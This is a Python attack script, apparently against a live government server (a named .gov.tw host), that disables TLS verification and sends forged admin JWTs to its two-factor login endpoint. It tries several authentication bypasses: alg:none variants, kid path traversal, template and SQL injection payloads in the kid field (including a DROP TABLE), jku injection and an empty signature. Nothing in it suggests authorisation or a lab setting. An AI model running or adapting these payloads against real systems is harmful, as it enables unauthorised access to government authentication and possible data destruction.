import base64, json, hmac, hashlib, ssl, urllib.request, urllib.error, time
CTX=ssl.create_default_context(); CTX.check_hostname=False; CTX.verify_mode=ssl.CERT_NONE
BASE="https://epcr.tpf.gov.tw:4004"

def b64(d): return base64.urlsafe_b64encode(d).rstrip(b'=')
payload=json.dumps({"user":{"username":"admin","role":"admin"},"permissions":["ADMIN"],"iat":1700000000,"exp":2000000000}).encode()
p=b64(payload)

def test_token(tok,label):
    body=json.dumps({"userToken":tok,"domain":"AUTH_SERVER"}).encode()
    req=urllib.request.Request(BASE+"/login2FA",data=body,method="POST",
        headers={"Content-Type":"application/json","Authorization":"Bearer "+tok,"User-Agent":"Mozilla/5.0"})
    try:
        r=urllib.request.urlopen(req,timeout=12,context=CTX); code=r.status; b=r.read().decode("utf-8","replace")
    except urllib.error.HTTPError as e: code=e.code; b=e.read().decode("utf-8","replace")
    except Exception as e: code=None; b=repr(e)
    # 提取 <h1> 或 JSON
    import re
    m=re.search(r'<h1>(.*?)</h1>',b)
    h1=m.group(1) if m else b[:80]
    print(f"  {label:28s} -> {code} | {h1}")
    return code,b

# 1. HS256→none (typ 变化)
h_none=b64(json.dumps({"alg":"none","typ":"JWT"}).encode())
tok_none=(h_none+b'.'+p+b'.').decode()
test_token(tok_none,"alg:none typ=JWT")

# 2. alg:None (大小写)
h_none2=b64(json.dumps({"alg":"None","typ":"JWT"}).encode())
test_token((h_none2+b'.'+p+b'.').decode(),"alg:None")

# 3. kid 注入 (path traversal)
h_kid=b64(json.dumps({"alg":"HS256","typ":"JWT","kid":"../../dev/null"}).encode())
test_token((h_kid+b'.'+p+b'.AAAA').decode(),"kid=../../dev/null")
h_kid2=b64(json.dumps({"alg":"HS256","typ":"JWT","kid":"/dev/null"}).encode())
test_token((h_kid2+b'.'+p+b'.AAAA').decode(),"kid=/dev/null")
h_kid3=b64(json.dumps({"alg":"HS256","typ":"JWT","kid":"${${7*7}}"}).encode())
test_token((h_kid3+b'.'+p+b'.AAAA').decode(),"kid=${7*7}")
h_kid4=b64(json.dumps({"alg":"HS256","typ":"JWT","kid":"'; DROP TABLE x;--"}).encode())
test_token((h_kid4+b'.'+p+b'.AAAA').decode(),"kid=SQLi")

# 4. jku 注入
h_jku=b64(json.dumps({"alg":"HS256","typ":"JWT","jku":"http://epcr.tpf.gov.tw:4004/"}).encode())
test_token((h_jku+b'.'+p+b'.AAAA').decode(),"jku=http://epcr...")

# 5. 空签名 HS256
h_hs=b64(json.dumps({"alg":"HS256","typ":"JWT"}).encode())
test_token((h_hs+b'.'+p+b'.').decode(),"HS256 empty sig")
print("DONE")
